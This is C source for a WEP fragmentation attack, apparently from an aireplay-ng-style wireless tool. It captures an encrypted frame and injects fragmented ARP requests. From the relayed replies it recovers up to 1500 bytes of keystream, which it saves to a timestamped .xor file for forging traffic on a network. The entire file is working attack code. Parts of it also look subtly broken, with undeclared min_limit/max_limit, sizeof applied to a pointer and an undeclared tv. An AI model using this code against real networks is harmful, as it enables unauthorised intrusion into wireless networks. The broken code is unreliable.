int gotit;
int isrelay;
int caplen;
int z;

int wait_packet(uchar *packet, uchar *iv, uchar *prga, int keystream_len,
    int arplen, int len, int min_caplen, int max_caplen)
{
    int round = 0;
    int again = RETRY;
    int packets;
    struct timeval tv, tv2;
    int acksgot;

    while(again == RETRY)
    {
        again = 0;

        PCT; printf("Trying to get %d bytes of a keystream\n", keystream_len);

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac,
            opt.r_sip, opt.r_dip, arplen);
        if ((round % 2) == 1)
        {
            PCT; printf("Trying a LLC NULL packet\n");
            memset(h80211+24, '\x00', arplen+8);
            arplen+=32;
        }

        acksgot=0;
        packets = (arplen-24) / len;
        if( (arplen-24) % len != 0 )
            packets++;

        send_fragments(h80211, arplen, iv, prga, len, 0);

        gettimeofday( &tv, NULL );

        gotit=0;
        while (!gotit)  //waiting for relayed packet
        {
            caplen = read_packet(packet, sizeof(packet), NULL);
            z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
            if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
                z+=2;

            if (packet[0] == 0xD4 )
            {
                if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                    acksgot++;
                continue;
            }

            //Is data frame && encrypted
            if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) )
            {
                if ( packet[1] & 2 ) //Is a FromDS packet with valid IV
                {
                    if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                    {
                        //From our MAC
                        if (! memcmp(opt.r_smac, packet+16, 6))
                        {
                            //Is short enough
                            if (caplen-z > min_limit && caplen-z < max_limit)
                            {
                                //This is our relayed packet!
                                PCT; printf("Got RELAYED packet!!\n");
                                gotit = 1;
                                isrelay = 1;
                            }
                        }
                    }
                }
            }

            if (memcmp(packet+4, opt.r_smac, 6) == 0)
            {
                /* check if we got an deauthentication packet */

                if(packet[0] == 0xC0)
                {
                    PCT; printf( "Got a deauthentication packet!\n" );
                    //sleep 5 seconds and ignore all frames in this period
                    read_sleep( 5*1000000 );
                }

                /* check if we got an disassociation packet */

                if(packet[0] == 0xA0)
                {
                    PCT; printf( "Got a disassociation packet!\n" );
                    //sleep 5 seconds and ignore all frames in this period
                    read_sleep( 5*1000000 );
                }
            }

            gettimeofday( &tv2, NULL );
            //wait 100ms for acks
            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) +
                    (tv2.tv_usec - tv.tv_usec)) >
                        (100*1000) && acksgot > 0 && acksgot < packets)
            {
                PCT; printf("Not enough acks, repeating...\n");
                again = RETRY;
                break;
            }

            //wait 1500ms for an answer
            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) +
                    (tv2.tv_usec - tv.tv_usec)) > (1500*1000)
                && !gotit)
            {
                PCT; printf("No answer, repeating...\n");
                round++;
                again = RETRY;
                if (round > 10)
                {
                    PCT;
                    printf("Still nothing, trying another packet...\n");
                    again = NEW_IV;
                }
                break;
            }
        }
    }
    return again;
}

int do_attack_fragment(uchar* prga)
{
    uchar packet[4096];
    uchar packet2[4096];
    uchar iv[4];
    prga = (uchar*) malloc(4096);

    char strbuf[256];

    struct tm *lt;

    int caplen2;
    int prga_len;
    int again;
    int length;
    uchar *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";

    caplen2 = isrelay = gotit = length = 0;

    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        return( 1 );
    }

    if(getnet(NULL, 1, 1) != 0)
        return 1;

    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
    {
        memset( opt.r_dmac, '\xFF', 6);
        opt.r_dmac[5] = 0xED;
    }

    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_sip, '\xFF', 4);
    }

    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_dip, '\xFF', 4);
    }

    PCT; printf ("Waiting for a data packet...\n");

    while(1)  // break at the end of loop
    {
        if( capture_ask_packet( &caplen, 0 ) != 0 )
            return -1;

        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
            z+=2;

        if((unsigned)caplen > sizeof(packet) ||
            (unsigned)caplen > sizeof(packet2))
            continue;

        memcpy( packet2, h80211, caplen );
        caplen2 = caplen;
        PCT; printf("Data packet found!\n");

        if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||
             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )
        {
            //0x42 instead of 0xAA
            packet2[z+4] = ((packet2[z+4] ^ 0x42) ^ 0xAA);
            //0x42 instead of 0xAA
            packet2[z+5] = ((packet2[z+5] ^ 0x42) ^ 0xAA);
            //0x00 instead of 0x08
            packet2[z+10] = ((packet2[z+10] ^ 0x00) ^ 0x08);
        }

        prga_len = 7;

        again = RETRY;

        memcpy( packet, packet2, caplen2 );
        caplen = caplen2;
        memcpy(prga, packet+z+4, prga_len);
        memcpy(iv, packet+z, 4);

        xor_keystream(prga, snap_header, prga_len);

        again = wait_packet(packet, iv, prga, 28, 31, 3, 0, 66);
        if(again == NEW_IV)
            continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac,
            opt.r_sip, opt.r_dip, 60);
        if (caplen-z == 71-24)
        {
            //Thats the LLC NULL packet!
            memset(h80211+24, '\x00', 39);
        }

        if (! isrelay)
        {
            //Building expected cleartext
            uchar ct[4096] = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01"\
                "\x08\x00\x06\x04\x00\x02";
            //Ethernet & ARP header

            //Followed by the senders MAC and IP:
            memcpy(ct+16, packet+16, 6);
            memcpy(ct+22, opt.r_dip,  4);

            //And our own MAC and IP:
            memcpy(ct+26, opt.r_smac,   6);
            memcpy(ct+32, opt.r_sip,   4);

            //Calculating
            memcpy(prga, packet+z+4, 36);
            xor_keystream(prga, ct, 36);
        }
        else
        {
            memcpy(prga, packet+z+4, 36);
            xor_keystream(prga, h80211+24, 36);
        }

        memcpy(iv, packet+z, 4);

        again = wait_packet(packet, iv, prga, 384, 408, 32, 400-24, 500-24);
        if (again == NEW_IV)
            continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac,
            opt.r_sip, opt.r_dip, 408);
        if (caplen == 408 + 16 + z)
        {
            //Thats the LLC NULL packet!
            memset(h80211+24, '\x00', 416);
        }

        memcpy(iv, packet+z, 4);
        memcpy(prga, packet+z+4, 384);
        xor_keystream(prga, h80211+24, 384);

        again = wait_packet(packet, iv, prga, 1500, 500, 300, 1496-24, 5000);
        if(again == NEW_IV)
            continue;

        if (again == ABORT) length = 408;
        else length = 1500;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac,
            opt.r_sip, opt.r_dip, length);
        if (caplen == length + 16 + z)
        {
            //Thats the LLC NULL packet!
            memset(h80211+24, '\x00', length+8);
        }

        if(again != ABORT)
        {
            memcpy(iv, packet+z, 4);
            memcpy(prga, packet+z+4, length);
            xor_keystream(prga, h80211+24, length);
        }

        lt = localtime( (const time_t *) &tv.tv_sec );

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "fragment-%02d%02d-%02d%02d%02d.xor",
                  lt->tm_mon + 1, lt->tm_mday,
                  lt->tm_hour, lt->tm_min, lt->tm_sec );
        save_prga(strbuf, iv, prga, length);

        printf( "Saving keystream in %s\n", strbuf );

        break;
    }

    return 0;
}
